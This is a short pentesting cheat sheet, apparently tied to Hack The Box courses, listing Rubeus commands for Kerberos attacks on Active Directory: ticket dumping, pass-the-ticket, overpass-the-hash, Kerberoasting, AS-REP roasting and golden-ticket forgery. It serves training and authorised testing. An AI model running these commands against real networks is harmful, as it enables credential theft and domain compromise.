# Rubeus

[![password_attacks](../../../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

<div class="row row-cols-lg-2"><div>

[Rubeus](https://github.com/GhostPack/Rubeus) <small>(3.8k ⭐)</small> is a Windows tool to interact with kerberos and manipulate tickets.

```shell!
PS> .\Rubeus.exe dump /nowrap # Dump tickets
```

Request and load a ticket in the current session:

```shell!
PS> # Load the ticket in the current session
PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /ptt
PS> .\Rubeus.exe asktgt /user:xxx$ /certificate:[...] /ptt
```

Pass the hash:

```shell!
PS> .\Rubeus.exe ptt /ticket:xxx@yyy.kirbi
PS> .\Rubeus.exe ptt /ticket:<the base64 encoded ticket>
```
</div><div>

Pass the Key / OverPass the Hash <small>(create a ticket)</small>:

```shell!
PS> .\Rubeus.exe ptt /ticket:xxx@yyy.kirbi
PS> .\Rubeus.exe ptt /ticket:<the base64 encoded ticket>
PS> # Pass the Key / OverPass the Hash == create a ticket
PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /aes256:xxx /nowrap
PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /nowrap
```

Kerberoasting

```shell!
PS> .\Rubeus.exe kerberoast /user:cn /nowrap # Request
PS> .\Rubeus.exe kerberoast /domain:dev.example.com /user:cn /nowrap
PS> .\Rubeus.exe kerberoast /stats # number of SPNs, encryption types
PS> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
PS> .\Rubeus.exe kerberoast /user:cn /nowrap # cn encryption settings
PS> .\Rubeus.exe kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap # try a downgrade attack
```

ASReproasting

```shell!
PS> .\Rubeus.exe asreproast /user:cn /nowrap /format:hashcat
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Cannot be compiled on Linux.

```shell!
$ DEST="$HOME/tools/rubeus"
$ git clone -b master https://github.com/GhostPack/Rubeus $DEST
$ # need .NET Framework v4.0 Developer Packs at https://aka.ms/msbuild/developerpacks
```
</div><div>

Golden ticket:

```shell!
PS> .\Rubeus.exe golden /rc4:<krbtgt hash> /domain:dev.example.com /sid:<child domain SID>  /sids:<target domain SID> /user:dummy /ptt
```
</div></div>